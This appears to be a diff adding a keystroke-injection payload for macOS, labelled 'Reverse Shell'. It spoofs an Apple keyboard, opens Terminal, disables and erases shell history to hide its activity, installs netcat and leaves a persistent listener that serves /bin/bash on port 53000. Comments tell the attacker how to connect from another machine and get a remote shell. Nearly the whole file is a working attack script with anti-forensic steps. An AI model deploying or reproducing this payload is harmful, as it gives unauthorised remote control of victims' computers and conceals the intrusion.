@@ -1,0 +1,62 @@
+REM installs netcat using home-brew (can adjust delay) 
+REM Runs the command nohup nc -l -p 53000 -vvv -e /bin/bash to start a netcat listener on port 53000 
+REM clears the terminal
+REM Gui m minimizes the terminal window
+
+
+
+REM Now on your separate computer in your terminal Run the command 'nc <remote-ip> 53000' 
+REM replace '<remote-ip>' with the IP address of the target computer.
+REM I've noticed that NC does not respond if you copy and paste so please type the I.P. out!
+REM If the connection is successful, you should now have a remote shell session on the remote computer.
+
+REM To kill the listening port (53000 in this case)
+REM you can use the kill command followed by the process ID (PID#)
+REM to find the PID use command 'ps -ef | grep "nc -lvp 53000"'
+REM Once you have the PID # run the command 'kill <PID#>'
+
+
+REM to check if the port is closed 
+REM on the target computer run the command 'netstat -tuln | grep 53000'
+REM If the listening port is closed, there should be no output or listing for port 53000.
+
+
+REM Requirements: install netcat on both the remote target and your computer 'brew install netcat'
+REM Requirements: Remote computer's IP address or hostname
+
+REM Title: Reverse Shell
+REM Author: NARSTY
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Recon
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING  brew install netcat
+DELAY 250
+ENTER
+DELAY 15000
+STRING  nohup nc -l -p 53000 -vvv -e /bin/bash &
+ENTER
+DELAY 500
+STRING  clear
+ENTER
+DELAY 1000
+GUI w
